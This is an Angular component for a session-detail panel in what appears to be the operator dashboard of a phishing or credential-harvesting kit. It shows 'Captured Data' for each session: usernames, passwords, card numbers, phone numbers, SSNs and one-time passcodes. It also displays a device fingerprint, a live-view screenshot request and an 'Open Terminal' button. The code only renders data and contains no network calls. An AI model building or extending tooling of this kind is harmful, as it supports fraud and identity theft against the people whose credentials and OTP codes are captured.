import { Component, Input, Output, EventEmitter, signal, computed } from '@angular/core';
import { CommonModule } from '@angular/common';

@Component({
    selector: 'app-session-detail-v2',
    standalone: true,
    imports: [CommonModule],
    template: `
    <div class="fixed inset-0 z-50 flex justify-end" *ngIf="session">
        <!-- Backdrop -->
        <div class="absolute inset-0 bg-slate-950/80 backdrop-blur-sm transition-opacity" 
             (click)="close.emit()"
             [class.opacity-0]="closing()"
             [class.opacity-100]="!closing()"></div>

        <!-- Slide-over Panel -->
        <div class="relative w-full max-w-2xl bg-slate-900 border-l border-slate-800 shadow-2xl transform transition-transform duration-300 flex flex-col"
             [class.translate-x-full]="closing()"
             [class.translate-x-0]="!closing()">
            
            <!-- Header -->
            <div class="p-6 border-b border-slate-800 flex items-start justify-between bg-slate-900/50">
                <div>
                   <div class="flex items-center gap-2 mb-1">
                      <span class="text-2xl">{{ session.flowIcon || '❓' }}</span>
                      <h2 class="adm-h3 text-white">{{ session.flowName || 'Unknown Flow' }}</h2>
                      <span class="px-2 py-0.5 rounded text-[10px] uppercase font-bold tracking-wider"
                           [class.bg-green-500-10]="isActive()"
                           [class.text-green-400]="isActive()"
                           [class.bg-slate-700]="!isActive()"
                           [class.text-slate-400]="!isActive()">
                           {{ session.status }}
                      </span>
                   </div>
                   <p class="font-mono text-xs text-slate-500">{{ session.id }}</p>
                </div>
                <button class="adm-btn adm-btn-ghost p-1 text-slate-400 hover:text-white" (click)="handleClose()">
                    <span class="material-icons">close</span>
                </button>
            </div>

            <!-- Scrollable Content -->
            <div class="flex-1 overflow-y-auto p-6 space-y-8">
                
                <!-- Screenshots / Live View -->
                <div class="space-y-3">
                    <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                        <span class="material-icons text-sm">visibility</span> Live View
                    </h3>
                    <div class="aspect-video bg-slate-950 rounded-lg border border-slate-800 flex items-center justify-center relative overflow-hidden group">
                        <!-- Mock Screenshot Placeholder -->
                        <div class="text-slate-600 flex flex-col items-center">
                            <span class="material-icons text-4xl mb-2">image_not_supported</span>
                            <span class="text-xs">No screenshot available</span>
                        </div>
                        
                        <!-- Overlay Actions -->
                        <div class="absolute inset-0 bg-black/50 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity">
                            <button class="adm-btn adm-btn-primary">
                                <span class="material-icons mr-2">camera_alt</span> Request Screenshot
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Captured Data -->
                <div class="space-y-3">
                    <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                        <span class="material-icons text-sm">data_object</span> Captured Data
                    </h3>
                    
                    <div class="grid grid-cols-2 gap-4">
                        @for (item of dataItems(); track item.label) {
                            <div class="p-3 bg-slate-800/50 rounded border border-slate-700/50">
                                <p class="text-[10px] text-slate-500 uppercase mb-1">{{ item.label }}</p>
                                <p class="text-sm text-white font-mono break-all">{{ item.value || '—' }}</p>
                            </div>
                        }
                    </div>
                </div>

                <!-- Device Info -->
                 <div class="space-y-3">
                    <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                        <span class="material-icons text-sm">devices</span> Device Fingerprint
                    </h3>
                    <div class="p-4 bg-slate-800/30 rounded border border-slate-700/50 font-mono text-xs text-slate-400 space-y-2">
                        <div class="flex justify-between">
                            <span>IP Address:</span>
                            <span class="text-white">{{ session.ip }}</span>
                        </div>
                         <div class="flex justify-between">
                            <span>User Agent:</span>
                            <span class="text-white max-w-[200px] truncate" [title]="session.userAgent">{{ session.userAgent }}</span>
                        </div>
                         <div class="flex justify-between">
                            <span>Location:</span>
                            <span class="text-white">{{ session.location }}</span>
                        </div>
                    </div>
                </div>

            </div>

            <!-- Footer Actions -->
            <div class="p-4 border-t border-slate-800 bg-slate-900/80 flex justify-between">
                <button class="adm-btn adm-btn-ghost text-red-400 hover:bg-red-500/10">
                    <span class="material-icons mr-2">block</span> Ban IP
                </button>
                <button class="adm-btn adm-btn-primary">
                    <span class="material-icons mr-2">terminal</span> Open Terminal
                </button>
            </div>
        </div>
    </div>
  `
})
export class SessionDetailV2Component {
    @Input() session: any;
    @Output() close = new EventEmitter<void>();

    closing = signal(false);

    isActive = computed(() => {
        return this.session?.status?.toLowerCase() === 'active' || this.session?.status?.toLowerCase() === 'verified';
    });

    dataItems = computed(() => {
        if (!this.session?.data) return [];
        const d = this.session.data;
        return [
            { label: 'Email / Username', value: d.email || d.username },
            { label: 'Password', value: d.password ? '••••••••' : null },
            { label: 'Card Number', value: d.cardNumber ? '•••• ' + d.cardNumber.slice(-4) : null },
            { label: 'Phone', value: d.phone },
            { label: 'SSN / ID', value: d.ssn },
            { label: 'OTP Code', value: d.otp }
        ].filter(i => i.value);
    });

    handleClose() {
        this.closing.set(true);
        setTimeout(() => {
            this.close.emit();
            this.closing.set(false);
        }, 300);
    }
}
